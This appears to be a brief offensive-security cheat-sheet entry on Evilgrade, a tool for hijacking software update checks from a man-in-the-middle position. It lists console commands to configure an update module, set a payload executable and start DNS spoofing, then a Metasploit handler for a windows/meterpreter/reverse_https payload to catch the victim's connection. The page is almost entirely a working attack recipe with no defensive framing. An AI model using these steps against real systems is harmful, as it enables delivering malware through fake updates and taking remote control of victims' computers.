# Evilgrade

Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. __You need to be MITM__ to use this tool (see Bettercap tool).

## Usage example

### Start DNS Spoofing & inject payload when requesting update

```
evilgrade > show modules (see programs that we can hijack their updates)
configure dap
show options
set agent <payload.exe>
set endsite www.speedbit.com
start
```

### Listening for payload execution

Payload will be executed immediately, so we need to be listening.

```
msfconsole
use exploit/multi/handler
show options
set PAYLOAD windows/meterpreter/reverse_https
```
